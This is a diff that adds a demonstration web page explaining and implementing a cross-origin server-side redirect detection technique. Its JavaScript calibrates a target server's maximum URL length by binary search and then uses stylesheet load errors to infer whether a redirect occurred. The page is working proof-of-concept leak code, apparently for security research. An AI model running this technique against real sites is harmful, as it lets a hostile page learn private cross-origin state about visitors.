@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Server Side Redirect Detection</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+    <div class="container">
+        <h1>Server Side Redirect Detection</h1>
+        <p>
+            A server-side redirect can be detected from a cross-origin page when the destination URL increase in size
+            and reflects a user input, either in the form of a query string parameter or a path.
+        </p>
+        <p>
+            The following technique relies on the fact it is possible to induce an error in most web-servers by
+            overloading
+            the request parameters/path.
+        </p>
+        <p>Since the redirect increases the size of the URL, it can be detected by sending exactly one character
+            less than the server maximum capacity, that way, if the size increases the server will respond with an
+            error
+            code which can be detected from a cross-origin page using common DOM APIs.</p>
+        <form>
+            <input type="url" required placeholder="https://example.com/" />
+            <button>Calibrate</button>
+        </form>
+        <pre></pre>
+    </div>
+
+    <script type="text/javascript">
+        const urlParams = new URLSearchParams(window.location.search);
+        const qs = q => document.querySelector(q);
+
+        const pre = qs("pre");
+        const form = qs("form");
+        const button = qs("form button");
+        const inputUrl = qs("form input");
+
+        // Custom parameter name support ?pp=MY_PARAM_NAME
+        const PAYLOAD_PARAMETER = urlParams.get("pp") || "rand0m";
+
+        let MAX_URL_SIZE = null;
+
+        form.addEventListener("submit", async function (e) {
+            e.preventDefault();
+
+            pre.innerText = "";
+            pre.style.display = 'none';
+            button.setAttribute("disabled", "");
+
+            if (MAX_URL_SIZE === null) {
+                MAX_URL_SIZE = await binarySearch(inputUrl.value);
+                button.innerText = "Is Redirect?";
+            } else {
+                let result = await hasHttpError(generateUrl(inputUrl.value, MAX_URL_SIZE));
+                log('Redirect?', (!result).toString().toUpperCase());
+            }
+
+            button.removeAttribute("disabled");
+            return false;
+        });
+
+        function log() {
+            if (pre.style.display === 'none') {
+                pre.style.display = 'block';
+            }
+            pre.innerText += Array.from(arguments).join(" ") + "\n";
+        }
+
+        function generateUrl(site, n) {
+            let sep = site.indexOf("?") === -1 ? `?${PAYLOAD_PARAMETER}=` : `&${PAYLOAD_PARAMETER}=`;
+            let url = site + sep;
+            while (url.length < n) {
+                url += "a";
+            }
+            return url;
+        }
+
+        function hasHttpError(url) {
+            const link = document.createElement("link");
+            link.rel = "stylesheet";
+            link.href = url;
+            return new Promise(resolve => {
+                link.onerror = () => {
+                    resolve(false);
+                    link.parentElement.removeChild(link);
+                };
+                link.onload = () => {
+                    resolve(true);
+                    link.parentElement.removeChild(link);
+                };
+                document.body.appendChild(link);
+            });
+        }
+
+        async function binarySearch(url) {
+            log("Binary searching the maximum server URL capacity...");
+            let result = null;
+            let left = 0, right = 1000000;
+            while (left < right) {
+                let mid = Math.floor((left + right) / 2);
+                result = await hasHttpError(generateUrl(url, mid));
+                log("Testing", mid, result.toString().toUpperCase());
+                if (result === false) {
+                    right = mid - 1;
+                } else {
+                    left = mid + 1;
+                }
+            }
+            result = await hasHttpError(generateUrl(url, left));
+            if (result === false)
+                left--;
+            log("--------------------");
+            log("MAX_URL_SIZE =", left);
+            log("Click the \"Is Redirect?\" button to detect redirects");
+            return left;
+        }
+    </script>
+</body>
+
+</html>
